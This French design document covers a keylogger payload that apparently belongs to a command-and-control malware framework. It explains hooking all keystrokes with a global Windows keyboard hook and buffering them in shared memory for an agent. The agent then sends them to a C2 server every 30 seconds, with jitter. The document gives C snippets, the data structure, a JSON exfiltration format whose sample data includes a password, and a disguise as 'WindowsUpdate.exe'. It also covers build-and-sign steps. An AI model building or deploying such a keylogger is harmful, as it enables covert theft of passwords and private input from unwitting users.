# Payload Keylogger

> Fichier source : [`keylogger_payload/keylogger_shmem.c`](../keylogger_payload/keylogger_shmem.c)

---

## Description

Le keylogger capture les frappes clavier de l'utilisateur et les communique a l'agent via une zone de **memoire partagee** (shared memory). L'agent lit periodiquement cette memoire et envoie les donnees au C2.

---

## Architecture

```
┌─────────────────────────┐        Shared Memory          ┌──────────────────────┐
│   keylogger_shmem.exe   │  "Local\KeyloggerSharedMem"  │      Agent           │
│                         │ ─────────────────────────► │                      │
│  SetWindowsHookEx()     │                              │  read_keylogger_data()│
│  (WH_KEYBOARD_LL)       │   write_index               │                      │
│                         │   read_index                 │  Toutes les 30s :    │
│  Ecrit dans buffer[]    │   is_active                  │  → send_keylogger_   │
│  circulaire             │   buffer[4096]               │    data_to_c2()      │
└─────────────────────────┘                              └──────────────────────┘
                                                                    │
                                                          POST /keylogger
                                                                    │
                                                         ┌──────────▼──────────┐
                                                         │     C2 Server        │
                                                         └─────────────────────┘
```

---

## Fonctionnement detaille

### 1. Initialisation (keylogger_shmem.exe)

1. Cree la zone de memoire partagee `Local\KeyloggerSharedMem`
2. Initialise le buffer circulaire (`write_index = 0`, `read_index = 0`)
3. Met `is_active = 1`
4. Installe le hook clavier global : `SetWindowsHookEx(WH_KEYBOARD_LL, ...)`
5. Entre dans une boucle de messages Windows (`GetMessage` / `TranslateMessage`)

### 2. Capture des frappes (hook callback)

A chaque frappe clavier :
- Le hook est appele avec le code de touche (`vkCode`)
- Le keylogger convertit le code en caractere lisible
- Touche speciale → ecrit un tag (`[ENTER]`, `[BACKSPACE]`, `[TAB]`, etc.)
- Caractere normal → ecrit directement dans le buffer circulaire
- Incemente `write_index` de maniere atomique (`InterlockedExchange`)

### 3. Buffer circulaire

```
buffer[4096]   : donnees brutes
write_index    : modifie par le keylogger (producteur)
read_index     : modifie par l'agent (consommateur)

Donnees disponibles = (write_index - read_index + 4096) % 4096
```

L'agent lit depuis `read_index` jusqu'a `write_index`, puis met a jour `read_index`.

### 4. Collecte par l'agent

L'agent verifie le keylogger toutes les **30 secondes** (6 heartbeats x 5s, maintenant avec jitter) :

```c
if (g_running_payload.is_running && strcmp(payload_name, "keylogger") == 0) {
    read_keylogger_data(buffer, sizeof(buffer));
    send_keylogger_data_to_c2(agent_id, buffer);
}
```

---

## Structure de la memoire partagee

```c
typedef struct {
    volatile LONG write_index;      // Index d'ecriture (keylogger)
    volatile LONG read_index;       // Index de lecture (agent)
    volatile LONG is_active;        // 1 = keylogger actif
    char buffer[4096];              // Buffer circulaire des frappes
} SharedKeyloggerData;
```

Nom de l'objet : `"Local\KeyloggerSharedMem"`

Le prefixe `Local\` signifie que la memoire est accessible dans la **meme session utilisateur**, sans droits administrateur.

---

## Format des donnees envoyees au C2

```json
{
  "agent_id": "<uuid>",
  "type": "keylogger_data",
  "data": "Bonjour[ENTER]mon mot de passe[BACKSPACE][BACKSPACE]...",
  "timestamp": 1700000000
}
```

Endpoint : `POST /keylogger`

---

## Tags de touches speciales

| Touche | Tag envoye |
|---|---|
| Entree | `[ENTER]` |
| Retour arriere | `[BACKSPACE]` |
| Tabulation | `[TAB]` |
| Suppr | `[DEL]` |
| Echap | `[ESC]` |
| Espace | ` ` (espace) |
| Fleches | `[UP]`, `[DOWN]`, `[LEFT]`, `[RIGHT]` |
| Touches Fn | `[F1]` ... `[F12]` |
| Ctrl, Alt, Shift | `[CTRL]`, `[ALT]`, `[SHIFT]` |

---

## Detection de la presence du keylogger

L'agent detecte si le keylogger est deja en cours en tentant d'ouvrir la shared memory :

```c
HANDLE hTest = OpenFileMappingA(FILE_MAP_READ, FALSE, "Local\\KeyloggerSharedMem");
if (hTest != NULL) {
    // Keylogger deja actif, ne pas relancer
}
```

---

## Arret

L'agent envoie `TASK_STOP` :
1. `TerminateProcess(process_handle, 0)` sur `WindowsUpdate.exe`
2. `DeleteFileA("C:\Users\Public\WindowsUpdate.exe")`
3. Reset de `g_running_payload`

Quand le keylogger est termine, il met `is_active = 0` dans la shared memory.

---

## Compilation

```bash
cd keylogger_payload
bash build_shmem.sh
```

Ou via le script principal :
```bash
./build_and_sign.sh keylogger_payload/keylogger_shmem.c
```

Flags necessaires : aucun supplementaire (pas de GDI32, pas de WinHTTP).

---

## Fichiers associes

| Fichier | Role |
|---|---|
| `keylogger_payload/keylogger_shmem.c` | Source du keylogger |
| `keylogger_payload/reader_test.c` | Outil de test de la shared memory |
| `keylogger_payload/build_shmem.sh` | Script de compilation |
| `keylogger_payload/SHARED_MEMORY.md` | Documentation de la shared memory |
| `keylogger_payload/encrypt_and_convert.py` | Script de chiffrement pour l'envoi au C2 |
